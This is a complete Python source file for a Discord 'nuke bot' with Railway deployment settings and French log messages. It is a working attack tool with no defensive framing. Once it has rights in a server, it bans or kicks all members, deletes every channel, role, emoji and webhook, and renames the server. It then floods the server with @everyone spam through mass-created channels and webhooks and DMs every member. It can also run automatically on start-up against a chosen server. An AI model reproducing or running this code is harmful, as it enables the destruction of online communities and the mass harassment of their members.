# language: Python 3.11+, file: bot.py, target: Discord API v10 + Railway
# Nuke Bot — concurrent, healthcheck on PORT, full options

from __future__ import annotations

import os
import sys
import asyncio
import logging
import traceback
from typing import Optional, List, Iterable

import aiohttp
from aiohttp import web
import discord
from discord.ext import commands
from discord.errors import HTTPException, Forbidden, NotFound
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("nuke")

# ───────────────────── ENV ─────────────────────
def env_str(key: str, default: str = "") -> str:
    return (os.getenv(key) or default).strip()

def env_bool(key: str, default: bool = False) -> bool:
    v = (os.getenv(key) or str(default)).strip().lower()
    return v in ("1", "true", "yes", "on", "y")

def env_int(key: str, default: int = 0) -> int:
    try:
        return int((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default

def env_float(key: str, default: float = 0.0) -> float:
    try:
        return float((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default

def env_ids(key: str) -> set[int]:
    raw = env_str(key)
    out: set[int] = set()
    for part in raw.replace(" ", "").split(","):
        if part.isdigit():
            out.add(int(part))
    return out

TOKEN = env_str("TOKEN")
OWNER_IDS = env_ids("OWNER_IDS")
PREFIX = env_str("PREFIX", "!") or "!"
PORT = env_int("PORT", 8080)

NUKE_NAME = env_str("NUKE_NAME", "NUKED") or "NUKED"
SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 50))
SPAM_MESSAGES = max(0, env_int("SPAM_MESSAGES", 15))
SPAM_TEXT = env_str("SPAM_TEXT", "@everyone NUKED") or "@everyone NUKED"
WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
BAN_REASON = env_str("BAN_REASON", "nuked") or "nuked"
DELETE_ROLES = env_bool("DELETE_ROLES", True)
DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
DELETE_WEBHOOKS = env_bool("DELETE_WEBHOOKS", True)
BAN_ALL = env_bool("BAN_ALL", True)
KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
SKIP_BOTS = env_bool("SKIP_BOTS", False)
SKIP_OWNER = env_bool("SKIP_OWNER", True)
CHANGE_ICON = env_bool("CHANGE_ICON", False)
ICON_URL = env_str("ICON_URL")
CHANGE_BANNER = env_bool("CHANGE_BANNER", False)
BANNER_URL = env_str("BANNER_URL")
CREATE_ROLES = max(0, env_int("CREATE_ROLES", 10))
ROLE_NAME = env_str("ROLE_NAME", "nuked") or "nuked"
CHANNEL_NAME = env_str("CHANNEL_NAME", "nuked") or "nuked"
CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 5))
CREATE_VOICE = max(0, env_int("CREATE_VOICE", 10))
DM_MESSAGE = env_str("DM_MESSAGE")
LOG_WEBHOOK = env_str("LOG_WEBHOOK")
AUTO_NUKE_GUILD = env_str("AUTO_NUKE_GUILD")
CONCURRENCY = max(1, min(env_int("CONCURRENCY", 8), 25))
RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.15))
PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
VANITY = env_str("VANITY")
KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))

# Boot diagnostics (never crash on missing owner)
log.info("=== NUKE BOT BOOT ===")
log.info("PORT=%s PREFIX=%s CONCURRENCY=%s", PORT, PREFIX, CONCURRENCY)
log.info("TOKEN set=%s len=%s", bool(TOKEN), len(TOKEN) if TOKEN else 0)
log.info("OWNER_IDS=%s", OWNER_IDS or "(empty)")

if not TOKEN:
    log.error("TOKEN manquant. Dans Railway → Variables → ajoute TOKEN=ton_token")
    log.error("Le health server démarre quand même pour éviter le crash loop opaque.")

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis_and_stickers = True
intents.moderation = True

bot = commands.Bot(
    command_prefix=PREFIX,
    intents=intents,
    help_command=None,
    chunk_guilds_at_startup=True,
)

sem: asyncio.Semaphore | None = None
_http: aiohttp.ClientSession | None = None
_bot_ready = False


def owner_only():
    async def pred(ctx: commands.Context) -> bool:
        if not OWNER_IDS:
            await ctx.send("OWNER_IDS non configuré sur Railway.")
            return False
        return ctx.author.id in OWNER_IDS
    return commands.check(pred)


async def get_http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession()
    return _http


async def external_log(msg: str):
    if not LOG_WEBHOOK:
        return
    try:
        session = await get_http()
        await session.post(LOG_WEBHOOK, json={"content": f"```{msg[:1900]}```"})
    except Exception:
        pass


async def say(msg: str):
    log.info(msg)
    await external_log(msg)


async def limited(coro):
    assert sem is not None
    async with sem:
        try:
            return await coro
        except HTTPException as e:
            if e.status == 429:
                retry = 1.5
                try:
                    if e.response is not None:
                        retry = float(e.response.headers.get("Retry-After", 1.5))
                except Exception:
                    pass
                await asyncio.sleep(retry)
                try:
                    return await coro
                except Exception:
                    return None
            return None
        except (Forbidden, NotFound):
            return None
        except Exception:
            return None
        finally:
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)


async def gather_limited(coros: Iterable):
    tasks = [asyncio.create_task(limited(c)) for c in coros]
    if not tasks:
        return []
    return await asyncio.gather(*tasks, return_exceptions=True)


# ───────────────────── ACTIONS ─────────────────────

async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception as e:
        log.warning("chunk failed: %s", e)
    return list(guild.members)


async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
    me = guild.me
    owner = guild.owner
    members = await fetch_members(guild)
    targets = []
    for m in members:
        if me and m.id == me.id:
            continue
        if SKIP_OWNER and owner and m.id == owner.id:
            continue
        if SKIP_BOTS and m.bot:
            continue
        targets.append(m)

    async def one(m: discord.Member):
        if DM_MESSAGE:
            try:
                await m.send(DM_MESSAGE)
            except Exception:
                pass
        if kick:
            await m.kick(reason=BAN_REASON)
        else:
            await m.ban(reason=BAN_REASON, delete_message_days=0)
        return 1

    results = await gather_limited(one(m) for m in targets)
    return sum(1 for r in results if r == 1)


async def action_delete_channels(guild: discord.Guild) -> int:
    async def one(ch):
        await ch.delete()
        return 1
    results = await gather_limited(one(ch) for ch in list(guild.channels))
    return sum(1 for r in results if r == 1)


async def action_delete_roles(guild: discord.Guild) -> int:
    me = guild.me
    roles = []
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        if me and role >= me.top_role:
            continue
        roles.append(role)

    async def one(role):
        await role.delete()
        return 1
    results = await gather_limited(one(r) for r in roles)
    return sum(1 for r in results if r == 1)


async def action_delete_emojis(guild: discord.Guild) -> int:
    async def one(e):
        await e.delete()
        return 1
    results = await gather_limited(one(e) for e in list(guild.emojis))
    return sum(1 for r in results if r == 1)


async def action_delete_stickers(guild: discord.Guild) -> int:
    async def one(s):
        await s.delete()
        return 1
    results = await gather_limited(one(s) for s in list(guild.stickers))
    return sum(1 for r in results if r == 1)


async def action_delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
    except Exception:
        return 0
    async def one(wh):
        await wh.delete()
        return 1
    results = await gather_limited(one(w) for w in webhooks)
    return sum(1 for r in results if r == 1)


async def download_bytes(url: str) -> Optional[bytes]:
    if not url:
        return None
    try:
        session = await get_http()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                return await resp.read()
    except Exception:
        pass
    return None


async def action_rename(guild: discord.Guild, name: str) -> bool:
    kwargs = {"name": name[:100]}
    if CHANGE_ICON and ICON_URL:
        data = await download_bytes(ICON_URL)
        if data:
            kwargs["icon"] = data
    if CHANGE_BANNER and BANNER_URL:
        data = await download_bytes(BANNER_URL)
        if data:
            kwargs["banner"] = data
    try:
        await guild.edit(**kwargs)
        return True
    except Exception as e:
        log.warning("rename failed: %s", e)
        return False


async def action_create_channels(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
    created: List[discord.TextChannel] = []
    async def one(i: int):
        return await guild.create_text_channel(f"{base}-{i}")
    results = await gather_limited(one(i) for i in range(n))
    for r in results:
        if isinstance(r, discord.TextChannel):
            created.append(r)
    return created


async def action_create_categories(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_category(f"{base}-cat-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_voice_channel(f"{base}-vc-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_create_roles(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_role(name=f"{base}-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        for _ in range(times):
            try:
                await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
            except Exception:
                break
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)
        return 1
    await gather_limited(one(ch) for ch in channels)


async def action_webhook_spam(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        wh = None
        try:
            wh = await ch.create_webhook(name="nuke")
            for _ in range(times):
                try:
                    await wh.send(text, username="NUKE", allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
                if RATE_LIMIT_DELAY:
                    await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            for _ in range(times):
                try:
                    await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
        finally:
            if wh:
                try:
                    await wh.delete()
                except Exception:
                    pass
        return 1
    await gather_limited(one(ch) for ch in channels)


async def action_dm_all(guild: discord.Guild, message: str) -> int:
    members = await fetch_members(guild)
    async def one(m: discord.Member):
        if m.bot or (guild.me and m.id == guild.me.id):
            return 0
        await m.send(message)
        return 1
    results = await gather_limited(one(m) for m in members)
    return sum(1 for r in results if r == 1)


async def action_prune(guild: discord.Guild, days: int) -> int:
    if days <= 0:
        return 0
    try:
        return await guild.prune_members(days=days, reason=BAN_REASON)
    except Exception:
        return 0


async def action_vanity(guild: discord.Guild, code: str) -> bool:
    if not code:
        return False
    try:
        await guild.edit(vanity_code=code)
        return True
    except Exception as e:
        log.warning("vanity failed: %s", e)
        return False


async def full_nuke(guild: discord.Guild):
    await say(f"[*] NUKE START → {guild.name} ({guild.id})")
    if BAN_ALL:
        n = await action_ban_all(guild, kick=KICK_INSTEAD)
        await say(f"[+] Ban/Kick: {n}")
    if PRUNE_DAYS > 0:
        n = await action_prune(guild, PRUNE_DAYS)
        await say(f"[+] Prune: {n}")
    if DELETE_WEBHOOKS:
        n = await action_delete_webhooks(guild)
        await say(f"[+] Webhooks deleted: {n}")
    n = await action_delete_channels(guild)
    await say(f"[+] Channels deleted: {n}")
    if DELETE_ROLES:
        n = await action_delete_roles(guild)
        await say(f"[+] Roles deleted: {n}")
    if DELETE_EMOJIS:
        n = await action_delete_emojis(guild)
        await say(f"[+] Emojis deleted: {n}")
    if DELETE_STICKERS:
        n = await action_delete_stickers(guild)
        await say(f"[+] Stickers deleted: {n}")
    ok = await action_rename(guild, NUKE_NAME)
    await say(f"[+] Rename/icon/banner: {ok}")
    if VANITY:
        ok = await action_vanity(guild, VANITY)
        await say(f"[+] Vanity: {ok}")
    if CREATE_ROLES:
        n = await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)
        await say(f"[+] Roles created: {n}")
    if CREATE_CATEGORIES:
        n = await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)
        await say(f"[+] Categories created: {n}")
    if CREATE_VOICE:
        n = await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)
        await say(f"[+] Voice created: {n}")
    channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
    await say(f"[+] Text channels created: {len(channels)}")
    if channels and SPAM_MESSAGES > 0:
        if WEBHOOK_SPAM:
            await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
        else:
            await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
        await say(f"[+] Spam done ({SPAM_MESSAGES}x × {len(channels)})")
    await say("[*] NUKE COMPLETE")


# ───────────────────── HEALTH (Railway) ─────────────────────

async def health_handler(_request):
    return web.Response(
        text="ok" if _bot_ready else "starting",
        status=200,
    )


async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("Health server listening on 0.0.0.0:%s", PORT)


# ───────────────────── EVENTS ─────────────────────

@bot.event
async def on_ready():
    global sem, _bot_ready
    sem = asyncio.Semaphore(CONCURRENCY)
    _bot_ready = True
    log.info("Online as %s | guilds=%s | owners=%s", bot.user, len(bot.guilds), OWNER_IDS)
    bot.loop.create_task(keepalive())
    if AUTO_NUKE_GUILD.isdigit():
        g = bot.get_guild(int(AUTO_NUKE_GUILD))
        if g:
            log.info("AUTO_NUKE → %s", g.name)
            await full_nuke(g)
        else:
            log.warning("AUTO_NUKE guild %s introuvable", AUTO_NUKE_GUILD)


async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SEC)
        log.info("keepalive | ready=%s guilds=%s latency=%.0fms", _bot_ready, len(bot.guilds), bot.latency * 1000)


@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        return
    log.error("cmd error: %s", error)
    try:
        await ctx.send(f"Erreur: `{error}`")
    except Exception:
        pass


@bot.event
async def on_error(event_method, *args, **kwargs):
    log.error("on_error %s\n%s", event_method, traceback.format_exc())


# ───────────────────── COMMANDS ─────────────────────

@bot.command(name="nuke")
@owner_only()
async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        await ctx.send("Guild introuvable.")
        return
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(f"Nuke lancé sur **{target.name}**…")
    await full_nuke(target)


@bot.command(name="banall")
@owner_only()
async def cmd_banall(ctx: commands.Context):
    n = await action_ban_all(ctx.guild, kick=False)
    await ctx.send(f"Banned: {n}")


@bot.command(name="kickall")
@owner_only()
async def cmd_kickall(ctx: commands.Context):
    n = await action_ban_all(ctx.guild, kick=True)
    await ctx.send(f"Kicked: {n}")


@bot.command(name="delchannels")
@owner_only()
async def cmd_delchannels(ctx: commands.Context):
    n = await action_delete_channels(ctx.guild)
    await ctx.send(f"Channels deleted: {n}")


@bot.command(name="delroles")
@owner_only()
async def cmd_delroles(ctx: commands.Context):
    n = await action_delete_roles(ctx.guild)
    await ctx.send(f"Roles deleted: {n}")


@bot.command(name="delemojis")
@owner_only()
async def cmd_delemojis(ctx: commands.Context):
    e = await action_delete_emojis(ctx.guild)
    s = await action_delete_stickers(ctx.guild)
    await ctx.send(f"Emojis: {e} | Stickers: {s}")


@bot.command(name="spam")
@owner_only()
async def cmd_spam(ctx: commands.Context, count: int = 20):
    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
    if WEBHOOK_SPAM:
        await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
    else:
        await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Spam: {len(channels)} channels")


@bot.command(name="webhookspam")
@owner_only()
async def cmd_webhookspam(ctx: commands.Context, count: int = 20):
    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
    await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Webhook spam: {len(channels)}")


@bot.command(name="rename")
@owner_only()
async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
    ok = await action_rename(ctx.guild, name)
    await ctx.send(f"Rename: {ok}")


@bot.command(name="createchannels")
@owner_only()
async def cmd_createchannels(ctx: commands.Context, n: int = 10):
    channels = await action_create_channels(ctx.guild, n, CHANNEL_NAME)
    await ctx.send(f"Created: {len(channels)}")


@bot.command(name="createroles")
@owner_only()
async def cmd_createroles(ctx: commands.Context, n: int = 10):
    count = await action_create_roles(ctx.guild, n, ROLE_NAME)
    await ctx.send(f"Roles created: {count}")


@bot.command(name="dmall")
@owner_only()
async def cmd_dmall(ctx: commands.Context, *, message: str):
    n = await action_dm_all(ctx.guild, message)
    await ctx.send(f"DM sent: {n}")


@bot.command(name="prune")
@owner_only()
async def cmd_prune(ctx: commands.Context, days: int = 1):
    n = await action_prune(ctx.guild, days)
    await ctx.send(f"Pruned: {n}")


@bot.command(name="vanity")
@owner_only()
async def cmd_vanity(ctx: commands.Context, code: str):
    ok = await action_vanity(ctx.guild, code)
    await ctx.send(f"Vanity: {ok}")


@bot.command(name="leave")
@owner_only()
async def cmd_leave(ctx: commands.Context):
    await ctx.send("Leaving…")
    await ctx.guild.leave()


@bot.command(name="guilds")
@owner_only()
async def cmd_guilds(ctx: commands.Context):
    lines = [f"{g.name} | `{g.id}` | {g.member_count}" for g in bot.guilds]
    await ctx.send(f"```{(chr(10).join(lines) or 'Aucun')[:1900]}```")


@bot.command(name="status")
@owner_only()
async def cmd_status(ctx: commands.Context):
    await ctx.send(
        f"**Online** `{bot.user}`\n"
        f"Guilds: `{len(bot.guilds)}`\n"
        f"Latency: `{round(bot.latency*1000)}ms`\n"
        f"Prefix: `{PREFIX}`\n"
        f"Port: `{PORT}`\n"
        f"Owners: `{OWNER_IDS}`"
    )


@bot.command(name="helpnuke")
@owner_only()
async def cmd_help(ctx: commands.Context):
    await ctx.send(
        f"```\n"
        f"{PREFIX}nuke [id]  {PREFIX}banall  {PREFIX}kickall\n"
        f"{PREFIX}delchannels  {PREFIX}delroles  {PREFIX}delemojis\n"
        f"{PREFIX}spam [n]  {PREFIX}webhookspam [n]\n"
        f"{PREFIX}rename  {PREFIX}createchannels  {PREFIX}createroles\n"
        f"{PREFIX}dmall  {PREFIX}prune  {PREFIX}vanity\n"
        f"{PREFIX}leave  {PREFIX}guilds  {PREFIX}status\n"
        f"```"
    )


# ───────────────────── ENTRY ─────────────────────

async def runner():
    await start_health_server()
    if not TOKEN:
        log.error("Pas de TOKEN — health OK, bot Discord OFF. Ajoute TOKEN puis redeploy.")
        # Keep process alive so Railway healthcheck passes and logs stay readable
        while True:
            await asyncio.sleep(3600)
        return
    try:
        async with bot:
            await bot.start(TOKEN, reconnect=True)
    except discord.LoginFailure:
        log.error("TOKEN INVALIDE — régénère le token sur https://discord.com/developers/applications")
        while True:
            await asyncio.sleep(3600)
    except Exception:
        log.error("Fatal bot:\n%s", traceback.format_exc())
        while True:
            await asyncio.sleep(3600)


def main():
    log.info("Starting…")
    try:
        asyncio.run(runner())
    except KeyboardInterrupt:
        pass
    except Exception:
        log.error("Fatal main:\n%s", traceback.format_exc())
        sys.exit(1)


if __name__ == "__main__":
    main()
